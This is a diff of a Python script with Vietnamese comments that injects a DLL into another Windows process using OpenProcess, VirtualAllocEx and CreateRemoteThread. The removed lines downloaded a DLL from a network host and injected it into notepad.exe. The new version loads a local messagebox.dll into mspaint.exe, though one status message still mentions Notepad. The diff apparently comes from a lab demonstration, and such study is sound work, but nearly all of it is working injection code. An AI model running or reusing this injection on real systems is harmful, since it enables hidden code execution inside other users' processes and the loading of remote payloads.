@@ -2,7 +2,6 @@ import os
 import sys
 import ctypes
 from ctypes import wintypes
-import urllib.request
 
 # ==================== HẰNG SỐ ====================
 PROCESS_ALL_ACCESS = 0x001FFFFF
@@ -79,24 +78,29 @@ def get_pid_by_name(proc_name):
     return 0
 
 # Bước 1: Tìm tiến trình mục tiêu
-target = "notepad.exe"
+target = "mspaint.exe"
 pid = get_pid_by_name(target)
 if not pid:
+    print(f"[-] Không tìm thấy {target}!")
     sys.exit(1)
+print(f"[+] Tìm thấy {target} - PID: {pid}")
 
-# Tải DLL từ máy chủ
-url = "http://172.16.64.152/test.dll"
-urllib.request.urlretrieve(url, "test.dll")
-dll_path = os.path.abspath("test.dll")
+# Lấy đường dẫn file messagebox.dll
+dll_path = os.path.abspath("messagebox.dll")
+if not os.path.exists(dll_path):
+    print(f"[-] Không tìm thấy: {dll_path}")
+    sys.exit(1)
 dll_bytes = dll_path.encode('utf-8') + b'\x00'
 
 # Bước 2: Mở tiến trình và cấp phát bộ nhớ
 hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
 if not hProcess:
+    print(f"[-] OpenProcess thất bại. Lỗi: {kernel32.GetLastError()}")
     sys.exit(1)
 
 addr = kernel32.VirtualAllocEx(hProcess, None, len(dll_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
 if not addr:
+    print(f"[-] VirtualAllocEx thất bại.")
     kernel32.CloseHandle(hProcess)
     sys.exit(1)
 
@@ -120,7 +124,7 @@ hThread = kernel32.CreateRemoteThread(
 )
 
 if hThread:
-    print(f"[+] Inject thành công!")
+    print(f"[+] Inject thành công! MessageBox sẽ hiển thị trên Notepad.")
     kernel32.WaitForSingleObject(hThread, 5000)
     kernel32.CloseHandle(hThread)
     kernel32.CloseHandle(hProcess)
